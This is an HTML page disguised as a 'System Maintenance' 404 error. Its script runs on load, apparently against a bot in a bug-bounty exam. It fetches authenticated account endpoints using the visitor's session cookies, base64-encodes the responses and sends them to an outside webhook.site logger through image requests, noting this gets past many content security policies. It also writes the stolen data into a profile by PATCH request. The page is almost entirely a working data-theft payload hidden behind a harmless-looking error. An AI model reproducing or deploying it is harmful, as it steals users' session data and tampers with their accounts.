<!DOCTYPE html>
<html>
<head><title>System Maintenance</title></head>
<body>
    <script>
        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
        const api = "https://api-bugbounty-exam.hashacademy.co/api";
        const myBookingId = "69dc1bd2d9d06cf59692979e";

        async function executeExploit() {
            // 1. Immediate Ping to Webhook
            new Image().src = `${logger}/?visit=bot_triggered&ts=${Date.now()}`;

            const endpoints = ["/auth/me", "/auth/profile", "/users/me"];
            let flagData = "";

            for (let path of endpoints) {
                try {
                    const res = await fetch(api + path, { credentials: "include" });
                    if (res.ok) {
                        const json = await res.json();
                        flagData = JSON.stringify(json);
                        
                        // Send found data to Webhook via Image (Bypasses many CSPs)
                        new Image().src = `${logger}/?path=${path}&data=${btoa(flagData)}`;
                        
                        // 2. BACKUP: Write the data into YOUR profile name
                        // This allows you to see the flag just by refreshing your dashboard
                        await fetch(api + "/auth/profile", {
                            method: "PATCH",
                            headers: { "Content-Type": "application/json" },
                            credentials: "include",
                            body: JSON.stringify({ 
                                "fullName": "PWN_" + flagData.substring(0, 20),
                                "address": { "street": flagData.substring(0, 100) }
                            })
                        });
                    }
                } catch (e) {}
            }
        }

        executeExploit();
    </script>
    <h1>Error 404</h1>
    <p>Resource not found.</p>
</body>
